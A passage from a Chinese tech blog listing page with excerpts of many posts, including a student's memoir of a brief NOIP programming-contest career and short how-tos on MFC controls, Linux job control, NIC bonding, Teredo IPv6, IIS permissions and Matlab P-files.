</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4defddb1788636569a036adb7f77ed4f/" rel="bookmark">
			我的OI生涯
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2010年11月20日，对我有着重大意义的日子。随着NOIP2010－－我的第一次NOIP也是最后一次NOIP的结束，我的OI生涯也结束了。上午还在福大考场中拼命做题，下午在为不知命运指向何方而紧张，回到家，打开电脑，删了满桌面的OI资料，删了无比熟悉的FreePascal，把已经到零的NOIP倒计时换成了高考倒计时……是啊，不得不告别OI了，不再是一个OIer了，我的OI生涯就这样突然结束了，心里感到无比失落、迷茫。今天考试第一题简单的模拟，可我没考虑全面，得了90分；第二题想了个五维动态规划，又怕时空复杂度太高爆0，于是交了个深搜+剪枝，剪枝又没考虑到n=1的情况，只得了20分，还不如不剪；三、四题没时间做也没去骗分，0分，总共110分，刚好比二等线差10分，只有三等奖了。这作为OI初学者的第一次NOIP可以算是个满意的揭幕，但同时作为高三党的最后一次NOIP，这个谢幕很悲惨，但是我还是可以毫不犹豫地说我无悔选择OI！如果非要说后悔的话，我只能后悔自己为什么没能进入好学校，没能早点接触OI，早一点成为一名OIer，而不是像现在这样，在自己的OI之路刚开始时就结束了。在这个时候，我想我该对我的OI生涯作一下回顾了。
我的OI生涯十分短暂，甚至不知道能不能算是“OI生涯”，只有从高二暑假到现在短短3个月，但它却给我带来了许多无比珍贵的东西。或许我根本就不曾算是个正真的OIer，和大部分OIer不一样，我的OI生涯最先也只能从高二说起。
高二，这是大部分OIer奋斗多年纷纷退役的时候，我知道了NOIP，我所在的初中、高中是只看重中高考的学校，学校对OI完全的漠视，导致热爱计算机的我高二才知道NOIP，也仅限于听说有个叫NOIP的电脑比赛，中文是全国青少年信息学奥林匹克联赛，学校没有培训，只有我一个人参加，我只能自学，完全不知道考什么、怎么考，更不知道学什么、怎么学。
高二国庆，我向同学借了本C语言的书，疯狂地看了一周，学完了基本语法，当时自己做出书上练习的喜悦、激动至今记忆犹新，这种激情就像一种烙印，深刻难忘，而那些为了保送而学OI的人是体会不到这种激情的吧。接着，我去参加了NOIP2009初赛，考得很差没通过，很受打击（赛后写了篇感受：http://hi.baidu.com/lyltim/blog/item/4e917cd9b4bb5fe338012f77.html）。当时我很迷茫，不知道该不该学OI，由于当时高二上学期学业会考抓得很紧，我高二上学期的时间都浪费在了准备会考上。
高二寒假，我上网找了本Pascal教材，期间还病了一场，几周带病坚持自学完了Pascal语法。
高二下学期，我还不了解OI，我的大部分时间还是放在那些高考科目上，用所有课外时间看基础数据结构（链表、栈、队列、树、图……），而高二下学期的课外时间寥寥无几，我根本没时间学OI，不得不一度终止学OI，没有OI的日子我很迷茫，我只好开始了不听课、不做作业来学OI，这对于绝大部分停课免考免作业的OIer来说很正常，但完全没有“奥赛”这个概念的二中从来没这一说。虽然整学期没听课没做作业，但我还能靠温书假几天自学各科整学期的知识做到都及格（全班那么多人作弊也没几个人及格），数学还能考第一。但是由于我平常作业没做，考试及格老师照样不给我学分，我也懒得管，人人作弊拿学分，这样所谓的学分不要也罢！
高二暑假，由于我爸的关系，我能去三中学OI了。当时我自学的都还是初赛知识，到了三中才进一步了解OI，在三中我学到了很多，在三中机房度过了一小段美好的时光，也是我高中阶段最美好、最难忘的时光。在三中，我看到了我与其他选手的巨大差距，甚至初中的小朋友就比自己强出很多。我想：别人能做到的，我也能通过无论多么艰苦的努力做到！我要在3个月时间内学完别的OIer几年学的知识（很多已是研究生课程）！高二暑假是我高二知道OI后唯一一块能学OI的时间，在我周围同学都在紧张地高考总复习的时候，顶着巨大压力，我毫不犹豫地选择了学OI！高三开始学OI是非常疯狂的，估计全国不会有第二个。记得当时三中老师跟我说希望很小，我知道3个月学OI就要在福建这样的OI强省拿一等奖几乎不可能，但我热爱计算机，我又不是为了保送，我只是想学我想学的知识！我要看看我的实力，我知道很多OI大牛的第一次NOIP也都是悲剧，我要看看我能考多少（现在看来好不到哪去）。由于当时暑假二中违规强行补课一个月，不去就记旷课，我也没在三中学，但拿到了一本OI教程《实用算法基础教程》，暑假被“自愿”上课浪费掉一个月，就剩一个月的时间，我又自学了大量基本算法：枚举、进制转换、高精度、排序、组合数学、矩阵、递推、回溯、贪心、分治、深搜、广搜……（我已把我当时学这本书时的上万行代码打包放在我的网盘：http://lyltim.ys168.com，留作美好的纪念，也可供学习这本书的同学参考），由于自学需要更多的时间投入，而我没时间了，暑假几乎每天6点起床，24点睡觉，飞速地每天自学一种算法。
高三开学，我开始自学基础数据结构、一些高级点的数据结构（如：并查集、堆、HASH……）和一些基础图论（Dijkstra、Floyd、Kruskal……）的具体代码实现，从三中拿回了很多配套练习和测试数据，知道了原来OI题是按测试数据算分的，以前我一直以为程序只要过了样例就算正确了，但其实过了样例什么都不是，有可能程序是完全错误的最后得0分。高三学业压力巨大，每天9节满满的课，我在学校也只能看OI书，那一段日子，我走路、坐车、吃饭、洗澡、睡觉……所有的时间都想着算法、数据结构，真的像走火入魔一般，但没什么时间能用电脑，编程重在实践，我只好平常连洗澡、睡觉的时间也省下来，每天晚上写代码写到凌晨2点，有时半夜睡到一半想到题目算法，爬起来坐到电脑前敲代码、调试，再去睡，第二天还要应付学校迟到、旷课各种麻烦，我不想管了……
高三国庆，我来到三中开始了听课，三中新高一的同学从暑假就开始集训，已经学到了动态规划，我就接进去跟着一起学了几天。然后用一周时间准备10月16日的初赛，这次初赛顺利通过。接下来，每周末去三中跟着他们学各种类型的动态规划和基础图论（Dijkstra、Floyd、SPFA、Prim、Kruskal、TopSort、Eulerian Tour……），他们免军训免考试的那段时间，我和他们一起每天早上8:30到校训练到晚上9:30，回家继续调试程序到凌晨。看着他们还能免作业、停课、免考、免军训……来集训，信息学完还有奥数、机器人竞赛……我真是无比羡慕，再想想我就读的学校，初中在延安中学这所只知道“中考”的“重点学校”呆了3年连听都没听说过信息学奥赛，电脑也被我爸从初二锁到高二，白白浪费了3年学OI的黄金时间，中考又由于各种因素以2分错别我向往的八中，高中在二中这所一类校中垫底的“重点学校”，更是只有“高考”没有其它，学校没政策、老师没义务，什么都没有，只有重重阻扰、种种威胁：不给学分、不给毕业……
复赛前2周，我还有很多知识没学，我不能再每天去学校浪费时间了（在我看来学校那样强行灌输洗脑、不允许思考的所谓的“文化课”完全是反文化课），于是我毅然决定自行停课，我只是想学OI，二中你算我旷课、不给毕业、退学，随你便吧~后来我爸没办法只好写申请给学校，总算过了。停课期间，我每天的生活就是：编程－－吃早饭－－编程－－吃午饭－－编程－－吃晚饭－－编程－－睡觉。我又自学了搜索的剪枝、分支定界、迭代加深、记忆化……拿着三中同学借的《奥赛经典》，复习我薄弱的基础、看着不会的提高组题目无奈，刷着普及组各种水题……
做题对于OIer来说至关重要，要拿一等奖，至少要刷几百道题，做完USACO前几章，而我做题很慢，一道有质量的题一般要做几小时甚至几天，因为做题太少，至今才做几十道像样的题目，也没做USACO，因为高三才开始学OI的我真的没时间去题库刷题，我只有无奈，我的实力参加NOIP能考怎样我自己也有准备。如果给我一年时间训练、如果延安能跟我说有NOIP、如果八中有录取我、如果二中能早点跟我说有NOIP……我都可以信心满满地拿回一等奖并且不影响学业，继续学OI，冲刺NOI……可现在说这有什么用呢？没有那么多的“如果”，我只能面对残酷的现实。我正式“退役”了，我的心很难受，OI在每个OIer心中都已不仅仅是一项学科竞赛，而是一种信念、一种精神！每一个不得不退役的OIer，每一个真正爱OI的OIer，应该都能理解体会。从不服输的我不得不向天朝霸道的教育体制低头，去浪费半年时间应付万恶的高考，或许我根本就不曾算是个OIer，希望高考后我能考上个大学，成为ACMer，完成我中学无法完成的梦。
OI伴随我的日子只有短短几个月，但终生难忘。这几个月的记忆又岂是这些文字所能够表述的呢？这中间还有多少辛酸、多少拼搏，或许只有亲身体验过的人，才能感受到。OI，再见。。。
LYL
2010.11.20
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8a1859a1f0a563ef21614afe10547fd/" rel="bookmark">
			在CComboBox组合框控件中 使用AddString()函数添加下拉列表项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用了下列代码
int classNum=ChooseClass.GetCurSel();CString studentID;for (int i=1;i&lt;stuNumChoose[classNum];i++){ studentID.Format(_T("%d"),i);((CComboBox*)GetDlgItem(IDC_COMBO2))-&gt;AddString(studentID);}发现 列表框中的数字很混乱 ，不是按照代码中的添加的次序显示
原因一：
在列表框中必须添加新数字序列时， 必须先清除列表框中原有数据，所以必须调用清除原有数据的函数。。。
int classNum=ChooseClass.GetCurSel();
CString studentID;
((CComboBox*)GetDlgItem(IDC_COMBO2))-&gt;ResetContent(); // 使用ResetContent()函数清除原有数据
for (int i=1;i&lt;stuNumChoose[classNum];i++)
{ studentID.Format(_T("%d"),i);
((CComboBox*)GetDlgItem(IDC_COMBO2))-&gt;AddString(studentID);
}
修改后，发现列表框中数据有了变化，但是还是达不到想象中的效果。
int classNum=ChooseClass.GetCurSel();CString studentID;((CComboBox*)GetDlgItem(IDC_COMBO2))-&gt;ResetContent(); // 使用ResetContent()函数清除原有数据for (int i=1;i&lt;stuNumChoose[classNum];i++){ studentID.Format(_T("%d"),i);((CComboBox*)GetDlgItem(IDC_COMBO2))-&gt;AddString(studentID);原因二：
根据分析，程序已经没有问题 那应该是组合框属性配置有问题
首先 使 SORT属性值为FALSE 。。。。。。这个列表框中的数据次序才为代码中添加的次序
另外 使NO Integral Height 属性设为TRUE。。。。。这样下拉列表框的高度才为初始设置的高度，否则则是有多少项便显示多少项的高度
NO Integral Height 意为：没有完整的高度------》当为TRUE时，表示高度为自己设定的高度 当为FALSE时，表示显示完整的高度
通过原因一、原因二进行修改后，已经达到了理想效果。
参考资料：
http://blog.csdn.net/dremi/archive/2007/11/22/1898527.aspx
http://hi.baidu.com/songwentao/blog/item/4085a74514e0742ecffca3f0.html
http://www.cnblogs.com/fence/archive/2010/01/09/1642861.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03e65a40c188d211dcbe3dc41f45ae4c/" rel="bookmark">
			前台后台运行程序命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用户有时的程序有可能要花费很多时间，如果将它放在前台运行，将导致无法继续做其他事情，最好的方法就是将它放在后台运行，甚至可能希望在用户注销系统后，程序还可以继续运行。让我们看看那如何实现这一目的。 1，在后台运行程序的&amp;、bg命令 将程序放到后台运行的最简单方法就是在命令最后加上“&amp;”,范例如下： [tony@free root]# updatedb &amp; ← 在后台执行 locate 数据库更新命令 [tony@free root]# bg ← 将更新操作放到后台运行 2，前台运行的程序fg命令 如果用户当前已有程序在后台运行，可以输入fg命令，将它从背景中移到前台运行： [tony@free root]# fg ← 放到前台执行的命令会显示出来 3，在退出后让程序继续运行的nohup命令 此命令可使用户退出系统后，程序继续运行。范例如下： [tony@free rony]$ nohup myserver &amp; 然后用户就可以退出了，当再次登录的时候，可以用ps –aux命令看到程序仍在后台中运行。[@more@] 来自 “ ITPUB博客 ” ，链接：http://blog.itpub.net/22934571/viewspace-1044827/，如需转载，请注明出处，否则将追究法律责任。 转载于:http://blog.itpub.net/22934571/viewspace-1044827/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa0038e2c56742586f9e3f9a0caf6de1/" rel="bookmark">
			开公司的心得－租房子，得注意！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一般性的要求，网上都可以找到，不提。只说点儿个人心得：
1、房子在一定程度上将会影响公司将来能够招聘到什么人，所以找个合适的地段很重要，如果是类似公司聚集的地方应该说相对比较好；
2、押金和租金的多少。特别是对于资金不是很宽裕的时候，这会影响资金链；
3、实地考察房子的时候，要着重看以下几个问题：
a、格局：当然个人认为方正的比较好处理。特别是不打算在装修上花什么钱的情况下更是如此。如果屋里有个大柱子，就不太好办了；
b、朝向：在北方，如果朝西，夏天可能会比较热。朝北，就看暖气是不是好了，否则很冷；
c、窗户：首先要关注密封性，其次关心大小和数量。
d、厕所：一定要关注一下厕所的干净程度，否则以后会难受；
e、公共区域的垃圾桶：看看有没人往里乱扔东西。比如，一般的垃圾桶的最上层是烟灰缸，有懒人会把用过的方便面盒子、饭盒、早餐后的小塑料袋直接放里面；
f、电梯：数量是一个。另外，可以尝试推断一下电梯的程序设计是否合理，否则，上下班的时候很难等到了；
g、邻居：关注一下将来的邻居都是什么类型的公司，有可能的话观察、猜测一下他们的员工的素质；
h、屋内的灯、插座、烟感和喷淋：包括数量、位置，最好能笔划一下装修方案。这些对装修都有影响；
i、网络：如果用网络，一定要打听一下能装哪家的线路，还有带宽和价钱，一般，物业都知道；
j、大楼附近的设施：在哪儿吃工作餐，在哪儿聚餐，在哪儿请客，附近有哪些银行等等；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a4ff6789f9a7ff8b738e5839649a92c/" rel="bookmark">
			编译GLib时提示 error: *** No iconv() implementation found in C library 的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在编译GLib时，如果libiconv是手动编译到指定目录的，会导致configure无法找到iconv库，执行configure前，可以立刻解决解决烦恼 setenv LDFLAGS '-L/usr/local/libiconv1.13/lib' 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27aa6942ef1e4bbcb6e173e48ee724fd/" rel="bookmark">
			qt 路径设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在 /etc/profile 文件的末尾加上以下语句 ：
QTDIR=path PATH=$QTDIR/qt/bin:$PATH
PATH=$QTDIR/bin:$PATH
MANPATH=$QTDIR/man:$MANPATH
LD_LIBRARY_PATH=$QTDIR/lib:$LD_LIBRARY_PATH
export QTDIR PATH MANPATH LD_LIBRARY_PATH 上面的语句中，将path替换成qtsdk的安装路径，比如 /home/user/qtsdk
保存后重启系统就行了 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a39c90e1c77b30bd9c42482b0c714e92/" rel="bookmark">
			[经验总结] MFC DLL——Regular DLL and Extension DLL（转载）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MFC DLL——Regular DLL and Extension DLL 收藏 2 MFC DLL ——扩展的和正规的
MFC 的 AppWizard 可以让我们创建 MFC 库支持的两种 DLL ：扩展的 DLL 和正规的 DLL 。这两种类型的区别是什么呢？
说明： 当然， Developer Studio 也让我们创建纯的、与 MFC 库无关的 Win32 DLL ，就像它让我们创建与 MFC 库无关的 Windows 程序一样。
² 扩展 DLL 支持 C++ 接口，换句话说，该 DLL 可以导出整个类，客户可以构造这些类的对象或从这些类进行派生。扩展 DLL 动态连接到 MFC 库的 DLL 版本的代码，因此，扩展 DLL 要求客户程序被动态连接到 MFC 库 (AppWizard 默认设置 ) ，并且客户程序和扩展 DLL 要一致连接到 MFC DLL 的相同版本 (mfc42.dll 、 mfcd42.dll 等 ) 。扩展 DLL 很小，我们可以创建一个简单的扩展 DLL ，大约 10KB 左右，它的装载会很快。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a39c90e1c77b30bd9c42482b0c714e92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c51b09dfca09feb5fc5ec24507e934c8/" rel="bookmark">
			Linux下通过bonding技术实现网络负载均衡及冗余
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自： http://blog.chinaunix.net/u2/64007/showart_2260398.html
Linux Bonding
一、什么是bonding
Linux bonding 驱动提供了一个把多个网络接口设备捆绑为单个的网络接口设置来使用，用于网络负载均衡及网络冗余 二、bonding应用方向 1、网络负载均衡 对于bonding的网络负载均衡是我们在文件服务器中常用到的，比如把三块网卡，当做一块来用，解决一个IP地址，流量过大，服务器网络压力过大的问题。对于文件服务器来说，比如NFS或SAMBA文件服务器，没有任何一个管理员会把内部网的文件服务器的IP地址弄很多个来解决网络负载的问题。如果在内网中，文件服务器为了管理和应用上的方便，大多是用同一个IP地址。对于一个百M的本地网络来说，文件服务器在多 个用户同时使用的情况下，网络压力是极大的，特别是SAMABA和NFS服务器。为了解决同一个IP地址，突破流量的限制，毕竟网线和网卡对数据的吞吐量是有限制的。如果在有限的资源的情况下，实现网络负载均衡，最好的办法就是 bonding 2、网络冗余 对于服务器来说，网络设备的稳定也是比较重要的，特别是网卡。在生产型的系统中，网卡的可靠性就更为重要了。在生产型的系统中，大多通过硬件设备的冗余来提供服务器的可靠性和安全性，比如电源。bonding 也能为网卡提供冗余的支持。 把多块网卡绑定到一个IP地址，当一块网卡发生物理性损坏的情况下，另一块网卡自动启用，并提供正常的服务，即：默认情况下只有一块网卡工作，其它网卡做备份 三、bonding实验环境及配置
1、实验环境
系统为：CentOS，使用4块网卡（eth0、eth1 ==&gt; bond0；eth2、eth3 ==&gt; bond1）来实现bonding技术 2、bonding配置
第一步：先查看一下内核是否已经支持bonding
1）如果内核已经把bonding编译进内核，那么要做的就是加载该模块到当前内核；其次查看ifenslave该工具是否也已经编译 modprobe -l bond* 或者 modinfo bonding modprobe bonding lsmod | grep 'bonding' echo 'modprobe bonding &amp;&gt; /dev/null' &gt;&gt; /etc/rc.local（开机自动加载bonding模块到内核） which ifenslave 注意：默认内核安装完后就已经支持bonding模块了，无需要自己手动编译 2）如果bonding还没有编译进内核，那么要做的就是编译该模块到内核 （1）编译bonding tar -jxvf kernel-XXX.tar.gz cd kernel-XXX make menuconfig 选择 " Network device support " -&gt; " Bonding driver support "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c51b09dfca09feb5fc5ec24507e934c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/553bd2b90adb56f6ad9e846b48002c56/" rel="bookmark">
			字符常量包含多个字符的一点思考--有疑问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一。先写段程序来看下机器的大端小端 1 #include&lt;stdio.h&gt; 2 /*函数checkCPU判断计算机是使用大端存储还是小端*/ 3 int checkCPU() 4 { 5 union w{ 6 int a; 7 char b; 8 }c; 9 c.a = 1; 10 11 return(c.b == 1); //如果是小端的话，则程序返回1 12 } 13 14 int main() 15 { 16 int b = checkCPU(); 17 if(1 == b) 18 { 19 printf("Little Endian!/n"); //小端 20 } 21 else 22 { 23 printf("Big Endian! /n"); 24 } 25 return 0; 26 } 编译：gcc testEndian.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/553bd2b90adb56f6ad9e846b48002c56/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3ad81639e3597d9531bea61e9b484eb/" rel="bookmark">
			vc中dll和lib生成不同的文件夹
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，在链接器/高级/导入库中填入要导出库的路径
2,探查选择否
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d1480a418f4cc784e87e0e21bee4e49/" rel="bookmark">
			http://evaphone.com完全免费的在线打电话
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		http://evaphone.com
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22c572af2828a0a4d24e05fdb278b5a4/" rel="bookmark">
			开启 Teredo 通道, 提前感受 IPv6 （for 非教育网用户）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		z转载自 http://felixcat.net/2010/04/install-teredo-ipv6/
当初Win7刚要出来时，Felix对其“DirectAccess”功能感到十分向往，从网上找到资料，发现这只是 Teredo 的一个应用。在其他平台上，也一样可以轻易开启 Teredo 从而访问 IPv6 资源。
×××希望各位公网用户不要再使用高校的isatap通道打开ipv6了，教育网的ipv6带宽很有限，而教育网的ipv4却不能出国，因此教育网ipv6是高校学生们获取我朝以外资源最实惠的途径了！×××
Windows XP(SP1+)：1
2 netsh interface ipv6 install
netsh interface ipv6 set teredo client
Windows Vista/7:1 netsh int ter set state client
Debian/Ubuntu Linux：1 sudo apt-get install miredo
Redhat/Fedora Linux:1
2 su -c 'yum install miredo'
su -c 'service miredo-client start'
如果经过上面的设置还无法连接，请继续往下看：
Windows XP：1 netsh interface ipv6 set teredo client &lt;服务器地址&gt;.
(注意有个句点)
Windows Vista/7:1 netsh int teredo set state client &lt;服务器地址&gt;.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22c572af2828a0a4d24e05fdb278b5a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d45f93d95698a90e63b2715cc47edc4e/" rel="bookmark">
			IIS 中的权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安全设置 IIS 中的权限 用 IIS 来做 Web 服务器的人一定也不少。说实话，我觉得 IIS 还是不错的，尤其是 Windows的 IIS 6（马上 Longhorn Server 的 IIS 7 也就要来了，相信会更好），性能和稳定性都相当不错。但是我发现许多用 IIS 的人不太会设置 Web 服务器的权限，因此，出现漏洞被人黑掉也就不足为奇了。但我们不应该把这归咎于 IIS 的不安全。如果对站点的每个目录都配以正确的权限，出现漏洞被人黑掉的机会还是很小的（Web 应用程序本身有问题和通过其它方式***黑掉服务器的除外）。下面是我在配置过程中总结的一些经验，希望对大家有所帮助。 2003 IIS Web 服务器的权限设置有两个地方，一个是 NTFS 文件系统本身的权限设置，另一个是 IIS 下网站-&gt;站点-&gt;属性-&gt;主目录（或站点下目录-&gt;属性-&gt;目录）面板上。这两个地方是密切相关的。下面我会以实例的方式来讲解如何设置权限。 IIS 下网站 -&gt;站点-&gt;属性-&gt;主目录（或站点下目录-&gt;属性-&gt;目录）面板上有： 脚本资源访问读取写入浏览记录访问索引资源 6 个选项。这 6 个选项中，“记录访问”和“索引资源”跟安全性关系不大，一般都设置。但是如果前面四个权限都没有设置的话，这两个权限也没有必要设置。在设置权限时，记住这个规则即可，后面的例子中不再特别说明这两个权限的设置。 另外在这 6 个选项下面的执行权限下拉列表中还有： 无纯脚本纯脚本和可执行程序 3 个选项。 而网站目录如果在 NTFS 分区（推荐用这种）的话，还需要对 NTFS 分区上的这个目录设置相应权限，许多地方都介绍设置 everyone 的权限，实际上这是不好的，其实只要设置好 Internet 来宾帐号（IUSR_xxxxxxx）或 IIS_WPG 组的帐号权限就可以了。如果是设置 ASP、PHP 程序的目录权限，那么设置 Internet 来宾帐号的权限，而对于 ASP.NET 程序，则需要设置 IIS_WPG 组的帐号权限。在后面提到 NTFS 权限设置时会明确指出，没有明确指出的都是指设置 IIS 属性面板上的权限。 例1 —— ASP、PHP、ASP.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d45f93d95698a90e63b2715cc47edc4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8211cc378dccfa649e1dc44c551cd8d5/" rel="bookmark">
			document.getElementById加onClick,onChange,style属性的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 &lt;a href="javascript:void(0)" id="c1"&gt;12322222222222222&lt;/a&gt;&lt;br&gt;
&lt;select id="s1"&gt;&lt;option value="1"&gt;111111111111&lt;/option&gt;&lt;option value="2"&gt;222222222222&lt;/option&gt;&lt;/select&gt;
&lt;script&gt;
document.getElementById ("c1").οnclick=function()
{
alert('c');
}
document.getElementById ("s1").οnchange=function()
{
s();
}
function s(){alert('s');}
&lt;/script&gt;
style设置：
document.getElementById(src).style.display="none"; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/588050d98b6f35ad1bcfb4255e8cf188/" rel="bookmark">
			Socket的正确关闭(改良版)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TIME_WAIT状态 如果服务端的Socket比客户端的Socket先关闭，会导致客户端出现TIME_WAIT状态，占用系统资源。 所以，必须等客户端先关闭Socket后，服务器端再关闭Socket才能避免TIME_WAIT状态的出现。 判断客户端Socket的关闭 最近试验发现，当客户端Socket关闭时，服务端的Socket会接收到0字节的通知。 private int Receive(StringBuilder sb) { int read = 0, total = 0; if (_Client != null) { try { byte[] bytes = new byte[SIZE]; int available = _Client.Available; do { read = _Client.Receive(bytes);//如果客户端Socket关闭，_Client会接受到read=0 total += read; if (read &gt; 0) sb.Append(_Server.DefaultEncoding.GetString(bytes, 0, read)); } while (read &gt; 0 &amp;&amp; total &lt; available); } catch (SocketException) { CloseSocket(); } } if (_Server.TraceInConsole &amp;&amp; total &gt; 0) { Console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/588050d98b6f35ad1bcfb4255e8cf188/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3053d0398ecbf5975b0ca6e2c6ceea8d/" rel="bookmark">
			wpf屏蔽窗口系统菜单
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近做了一个登录窗口，其中WindowStyle="None"，隐藏了窗口的标题栏。但是当用alt+space快捷键的时候，系统菜单还是会弹出来。最后在网上找到了屏蔽的方法。
主要是调用API函数实现，GetSystemMenu用来取得系统菜单，GetMenuItemCount得到菜单的个数，而后用RemoveMenu把菜单项一一删掉。
using System.Windows.Interop;using System.Runtime.InteropServices;namespace WpfApplication1{public partial class LogonWindow : Window{[DllImport("user32.dll", EntryPoint = "GetSystemMenu")]private static extern IntPtr GetSystemMenu(IntPtr hwnd, int revert);[DllImport("user32.dll", EntryPoint = "RemoveMenu")]private static extern int RemoveMenu(IntPtr hmenu, int npos, int wflags);[DllImport("user32.dll", EntryPoint = "GetMenuItemCount")]private static extern int GetMenuItemCount(IntPtr hmenu);private const int MF_BYPOSITION = 0x0400;private const int MF_DISABLED = 0x0002;public LogonWindow(){InitializeComponent();SourceInitialized += new EventHandler(LogonWindow_SourceInitialized);}void LogonWindow_SourceInitialized(object sender, EventArgs e){IntPtr handle = new WindowInteropHelper(this).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3053d0398ecbf5975b0ca6e2c6ceea8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a79d89ddb163d01f3b028e2971e9fca4/" rel="bookmark">
			Matlab P文件——加快Matlab程序，保护你的算法(z)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		P文件是对应M文件的一种预解析版本（preparsed version）。因为当你第一次执行M文件时，Matlab需要将其解析（parse）一次（第一次执行后的已解析内容会放入内存作第二次执行时使用，即第二次执行时无需再解析），这无形中增加了执行时间。所以我们就预先作解释，那么以后再使用该M文件时，便会直接执行对应的已解析版本，即P文件。但又因为Matlab的解析速度非常快，一般不用自己作预解析。只有当一些程序要调用到非常多的M文件时，如GUI应用程序时，才会作预解析，以增加以后的调用速度。 P文件可以用来作保密代码之用，如果你给别人一个M文件，别人可以打开来看到你所有的代码和算法。如果你的代码不想被别人看到，那可以给他P文件。 pcode函数也可以应用在M函数文件。 Matlab命令：pcode pcode fun pcode *.m pcode fun1 fun2 ... pcode... -inplace Description pcode fun obfuscates (i.e., shrouds ) M-file fun.m for the purpose of protecting its proprietary source code. The encrypted M-code is written to P-file fun.p in the current directory. The original M-file can be anywhere on the search path. If the input file resides within a package and/or class directory, then the same package and class directories are applied to the output file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a79d89ddb163d01f3b028e2971e9fca4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b831d7cbc3898c7d43edc63e7cbe069e/" rel="bookmark">
			MFC 模态对话框dlg.DoModal()返回值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		喜欢古典文学的可以关注 头条号：古典小说 微信公众号：古典小说网
如果想关注计算机编程等方面的 ，可以关注头条号： 讨厌编程
查了很多资料,都说DoModal()返回值为OK或CANCEL键的ID
其实，这种说法是错误的
MSDN是这样说明其返回值的
If successful, the value of the nRetCode parameter specified in the call toEndDialog; otherwise, -1.
如果操作成功，其返回值为由EndDialog指定的nRetCode的值，而此参数nRetCode的含义为关闭对话框所采用的方式
也就是说，在关闭此模态对话框时，其返回值为关闭对话框时所采用的方式
因此它只在对话框关闭时才返回相关参数值
默认对话框关闭方式有2种：OnOK(); OnCancel()
当使用OnOK()函数关闭对话框时，返回值为IDOK
当使用OnCancel()函数关闭对话框时，返回值为IDCANCEL
返回值与ID无关 比如一个按钮的ID为IDC_BUTTON1
在此按钮的处理函数中添加关闭对话框方式： OnOk()
则 点击此按钮时，对话框返回值为IDOK
除此两种默认关闭方式外，还可用EndDialog（int nRetCode）设定自定义的关闭方式
如下例子：
void EndDialog( int nResult ); Parameters nResult Contains the value to be returned from the dialog box to the caller of DoModal. Remarks This member function returns nResult as the return value of DoModal.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b831d7cbc3898c7d43edc63e7cbe069e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
